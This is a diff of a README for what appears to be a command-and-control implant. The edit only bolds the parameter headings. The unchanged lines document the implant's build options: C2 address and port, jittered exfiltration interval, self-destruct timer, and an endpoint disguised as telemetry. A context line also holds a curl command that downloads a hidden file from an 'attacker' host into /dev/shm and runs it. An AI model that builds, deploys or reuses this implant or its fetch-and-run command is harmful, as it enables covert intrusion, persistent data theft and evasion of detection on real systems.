@@ -58,7 +58,7 @@ curl -s -o /dev/shm/.upd http://attacker:8000/update && chmod +x /dev/shm/.upd &
 
 ## Configurable Parameters
 
-1. C2_IP & C2_PORT (required)
+**1. C2_IP & C2_PORT (required)**
 
 ```bash
 make C2_IP=192.168.1.100 C2_PORT=80
@@ -69,7 +69,7 @@ make C2_IP=192.168.1.100 C2_PORT=80
 - Port Default: 80
 - The deployer decodes at runtime and connects via raw socket TCP
 
-2. INTERVAL (optional)
+**2. INTERVAL (optional)**
 
 ```bash
 make C2_IP=10.0.0.5 C2_PORT=80 INTERVAL=1800
@@ -79,8 +79,7 @@ make C2_IP=10.0.0.5 C2_PORT=80 INTERVAL=1800
 - Default: 3600 (1 hour)
 - The value is not fixed, jittered_sleep() applies ±20% randomization. So INTERVAL=3600 results in exfiltrations every ~2880-4320 seconds
 
-3. DESTRUCT (optional)
-
+**3. DESTRUCT (optional)**
 
 ```bash
 make C2_IP=10.0.0.5 C2_PORT=80 DESTRUCT=604800
@@ -89,7 +88,7 @@ make C2_IP=10.0.0.5 C2_PORT=80 DESTRUCT=604800
 - Time in seconds after which the implant self-destructs
 - Default: 0 (disabled)
 
-4. ENDPOINT (optional)
+**4. ENDPOINT (optional)**
 
 ```bash
 make C2_IP=10.0.0.5 C2_PORT=443 ENDPOINT=/api/v2/telemetry
